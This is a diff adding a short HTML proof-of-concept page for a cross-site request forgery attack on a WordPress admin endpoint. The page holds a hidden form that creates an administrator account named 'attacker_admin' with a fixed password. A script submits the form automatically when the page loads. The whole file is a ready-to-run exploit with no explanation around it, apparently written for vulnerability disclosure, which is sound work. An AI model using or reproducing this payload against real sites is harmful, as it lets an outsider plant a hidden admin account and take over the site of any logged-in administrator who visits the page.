@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Action PoC</title>
+</head>
+<body>
+    <!-- Hidden form targeting the vulnerable endpoint -->
+    <form id="csrfForm" action="https://levelswim.s6-tastewp.com/wp-admin/user-new.php" method="POST">
+        <input type="hidden" name="action" value="createuser">
+        <input type="hidden" name="user_login" value="attacker_admin">
+        <input type="hidden" name="email" value="attacker@mail.com">
+        <input type="hidden" name="pass1" value="StrongPassword123!">
+        <input type="hidden" name="pass2" value="StrongPassword123!">
+        <input type="hidden" name="role" value="administrator">
+    </form>
+
+    <script>
+        // Automatically submit the form upon page load
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
